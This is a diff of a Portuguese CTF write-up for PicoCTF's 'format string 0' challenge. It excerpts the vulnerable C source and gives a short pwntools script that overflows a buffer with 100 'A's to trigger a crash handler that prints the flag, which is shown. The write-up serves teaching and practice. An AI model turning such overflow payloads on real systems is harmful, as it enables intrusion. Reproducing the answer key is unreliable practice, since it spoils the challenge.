@@ -1,6 +1,6 @@
 # WriteUp: format string 0
 ## Descrição do Desafio:
-**Author**: Cheng Zhang \
+**Autor**: Cheng Zhang \
 **Plataforma**: [PicoCTF](https://play.picoctf.org/practice/challenge/433?category=6&page=1) \
 **Categoria**: Binary Exploitation \
 **Dificuldade**: Fácil \
@@ -9,7 +9,10 @@
 > Can you use your knowledge of format strings to make the customers happy?
 ## Passo a Passo da Solução
 ### 1. Análise do arquivo fornecido
-Este desafio nos fornece o seu código fonte, `.c`. Analisando ele, vemos que ele contém diversas funções, mas elas estão todas ali para te distrair, porque logo na `main()` podemos notar que é setado uma função para caso ocorra segmentation fault, e a função que é chamada imprime a flag para nós.
+Este desafio nos fornece o seu código fonte, `.c`. Analisando ele, vemos que ele contém diversas funções, mas elas estão todas ali para te distrair, porque logo na `main()` podemos notar que é setado uma função para caso ocorra *segmentation fault*, e a função que é chamada imprime a **flag** para nós.
+
+{% code title="vuln.c" overflow="wrap" lineNumbers="true" %}
+
 ```c
 void sigsegv_handler(int sig) {
     printf("\n%s\n", flag);
@@ -38,7 +41,13 @@ int main(int argc, char **argv){
     return 0;
 }
 ```
-Outra coisa muito interessante, é que na função `serve_patrick()`, podemos estourar um buffer que tem ali, causando segmentation fault.
+
+{% endcode %}
+
+Outra coisa muito interessante, é que na função `serve_patrick()`, podemos estourar um *buffer* que tem ali, causando *segmentation fault*.
+
+{% code title="vuln.c" overflow="wrap" lineNumbers="true" %}
+
 ```c
 void serve_patrick() {
     printf("%s %s\n%s\n%s %s\n%s",
@@ -70,9 +79,14 @@ void serve_patrick() {
 }
 ```
 
+{% endcode %}
+
 ### 2. Solução
-A solução é simples, basta estourar o buffer na função `serve_patrick()`.
+A solução é simples, basta estourar o *buffer* na função `serve_patrick()`.
 ### 2.1 Solução com Python
+
+{% code title="solve.py" overflow="wrap" lineNumbers="true" %}
+
 ```py
 from pwn import *
 
@@ -83,7 +97,10 @@ payload = "A" * 100
 p.sendlineafter(b"recommendation: ", payload)
 print(p.recvall().decode())
 ```
+
+{% endcode %}
+
 ### Flag
 `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}`
-## Autor
+## Autor da WriteUp
 [Membro de Exploitation - HenriUz](https://github.com/HenriUz)
